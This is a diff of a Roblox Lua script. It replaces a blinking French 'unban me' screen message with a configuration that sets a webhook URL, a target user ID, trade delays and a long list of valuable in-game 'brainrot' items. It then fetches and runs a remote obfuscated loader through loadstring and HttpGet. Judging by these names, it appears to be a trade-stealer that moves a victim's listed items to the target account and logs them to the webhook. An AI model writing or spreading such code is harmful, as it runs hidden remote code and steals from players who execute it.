@@ -1,61 +1,108 @@
--- 404
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-local player = game.Players.LocalPlayer
-
-local gui = Instance.new("ScreenGui")
-gui.Parent = player:WaitForChild("PlayerGui")
-
-local text = Instance.new("TextLabel")
-text.Parent = gui
-text.Size = UDim2.new(1, 0, 1, 0) -- plein écran
-text.Position = UDim2.new(0, 0, 0, 0)
-text.BackgroundTransparency = 1
-
-text.Text = "SCAMEUR DEBAN MOI\nSINON T'AURA PAS DE SCRIPT"
-text.TextColor3 = Color3.fromRGB(255, 0, 0)
-text.TextStrokeTransparency = 0
-text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-
-text.TextScaled = true
-text.Font = Enum.Font.Arcade
-text.TextWrapped = true
-
--- petit effet clignotant
-while true do
-	text.Visible = true
-	wait(0.5)
-	text.Visible = false
-	wait(0.5)
-end
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_c7f8497bb1b14c8a8c4b6c6529d18d73"
+getgenv().TARGET_ID = 1486109757
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["1x1x1x1"] = true,
+    ["25"] = true,
+    ["67"] = true,
+    ["Agarrini la Palini"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Bisonte Giuppitere"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cerberus"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Chicleteirina Bicicleteirina"] = true,
+    ["Chicliterita bicicliterita"] = true,
+    ["Chill Puppy"] = true,
+    ["Chillin Chili"] = true,
+    ["Chimnino"] = true,
+    ["Chipso and Queso"] = true,
+    ["Cooki and Milki"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Esok Sekolah"] = true,
+    ["Eviledon"] = true,
+    ["Festive 67"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Guest 666"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketupat Kepat"] = true,
+    ["La Casa Boo"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Grande Combinasion"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Las Sis"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["List List List Sahur"] = true,
+    ["Los 25"] = true,
+    ["Los 67"] = true,
+    ["Los Bros"] = true,
+    ["Los Candies"] = true,
+    ["Los Chicleteiras"] = true,
+    ["Los Combinasionas"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+    ["Los Planitos"] = true,
+    ["Los Primos"] = true,
+    ["Los Puggies"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Sweethearts"] = true,
+    ["Los Tacoritas"] = true,
+    ["Lovin Rose"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Meowl"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["Money Money Puggy"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Noo my Heart"] = true,
+    ["Noo my examine"] = true,
+    ["Nooo My Hotspot"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Orcaledon"] = true,
+    ["Perrito Burrito"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Pot Hotspot"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["Rang Ring Bus"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Sammyni Spyderini"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Spinny Hammy"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Swag Soda"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Tictac Sahur"] = true,
+    ["Tralaledon"] = true,
+    ["Tuff Toucan"] = true,
+    ["W or L"] = true,
+    ["Yess my examine"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
